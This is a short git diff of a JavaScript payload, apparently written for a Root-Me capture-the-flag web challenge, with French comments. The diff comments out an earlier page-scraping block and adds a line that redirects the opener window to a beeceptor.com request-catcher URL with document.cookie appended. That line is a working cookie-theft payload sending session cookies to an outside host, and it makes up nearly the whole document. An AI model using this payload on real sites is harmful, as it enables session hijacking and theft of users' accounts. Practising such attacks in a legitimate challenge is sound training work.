@@ -16,6 +16,7 @@ const newWindow = window.open('http://challenge01.root-me.org:58003/profile');
 setTimeout(() => {
   if (newWindow) {
     try {
+      /*
       // Récupérer tous les paragraphes de la nouvelle fenêtre
       const paragraphs = newWindow.document.querySelectorAll('p');
       let text = "";
@@ -35,6 +36,9 @@ setTimeout(() => {
       .then(response => response.json())
       .then(data => console.log('Réponse du serveur:', data))
       .catch(error => console.error('Erreur lors de la requête:', error));
+      */
+
+    window.opener.location = "https://app.beeceptor.com/console/volatile" + window.opener.document.cookie;
     } catch (error) {
       console.error('Erreur lors de l\'accès au contenu:', error);
       // Gestion de l'erreur de politique de même origine (CORS)
